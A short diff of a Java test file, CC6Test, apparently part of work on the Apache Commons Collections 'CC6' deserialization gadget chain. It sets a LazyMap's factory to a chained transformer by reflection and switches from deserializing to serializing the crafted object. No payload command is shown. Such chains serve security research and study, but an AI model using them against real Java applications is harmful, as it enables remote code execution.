@@ -9,7 +9,6 @@ import org.apache.commons.collections.map.LazyMap;
 
 import java.io.*;
 import java.lang.reflect.Field;
-import java.lang.reflect.Modifier;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -39,8 +38,8 @@ public class CC6Test {
         factoryField.setAccessible(true);
         factoryField.set(lazyMap,chainedTransformer);
 
-//        serialize(map2);
-        unserialize("ser.bin");
+        serialize(map2);
+//        unserialize("ser.bin");
 
 
 
